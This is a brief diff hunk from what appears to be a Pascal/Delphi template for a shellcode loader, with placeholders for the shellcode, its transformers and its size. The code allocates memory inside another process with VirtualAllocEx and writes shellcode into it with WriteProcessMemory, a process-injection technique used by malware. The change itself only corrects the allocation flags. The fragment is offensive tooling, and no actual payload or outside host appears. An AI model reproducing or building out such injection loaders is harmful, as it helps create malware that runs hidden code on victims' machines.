@@ -48,7 +48,7 @@ begin
 
     {shellcode}
     {transformers}
-    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT, PAGE_EXECUTE_READ);
+    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READ);
 
     WriteProcessMemory(pi.hProcess, addr, @shellcode[0], {shellcodeSize}, nil);
 
